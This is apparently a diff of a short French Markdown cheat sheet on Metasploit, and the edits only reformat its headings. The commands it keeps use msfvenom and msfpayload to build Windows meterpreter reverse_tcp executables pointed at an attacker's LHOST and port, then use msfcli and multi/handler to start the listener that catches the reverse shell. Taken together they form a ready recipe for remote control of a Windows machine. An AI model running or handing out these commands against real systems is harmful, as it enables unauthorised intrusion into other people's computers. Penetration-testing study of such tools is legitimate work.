@@ -1,7 +1,7 @@
-﻿#Metasploit#
+## Metasploit ##
+### Generation de payload executables ###
+#### Manuel ####
 
-##Genration de payload executables##
-###Manuel###
 ~~~~~~~
 # msfvenom -h
 Usage: /opt/framework/msf3/msfvenom [options] 
@@ -23,23 +23,26 @@ Options:
     -h, --help                       Show this message
 ~~~~~~~
 
-###Exemple###
-####Lister les options d'un payload####
+####Exemple####
+
+Lister les options d'un payload
+
 ~~~~~~~
 # msfvenom -p windows/meterpreter/reverse_tcp -o
 ~~~~~~~
 
-####Créer un payload meterpreter pour windows####
+Creer un payload meterpreter pour windows
+
 ~~~~~~~
 # msfvenom -p windows/meterpreter/reverse_tcp -f exe LHOST=$(ifdata -pa eth0) LPORT=5555 > windobReverseMeterpreter5555.exe
 ~~~~~~~
 
-###Alternative###
+####Alternative####
 ~~~~~~~
 # msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.1 X > met-reverse.exe
 ~~~~~~~
 
-##Lancement de handler##
+###Lancement de handler###
 ~~~~~~~
 # msfcli multi/handler LPORT=5555 E
 
@@ -60,4 +63,5 @@ set LPORT 8888
 exploit
 ~~~~~~~
 
-https://github.com/MrTchuss/Metasploit-stuff/tree/master/tools
+[MrTchuss] (https://github.com/MrTchuss/Metasploit-stuff/tree/master/tools)
+
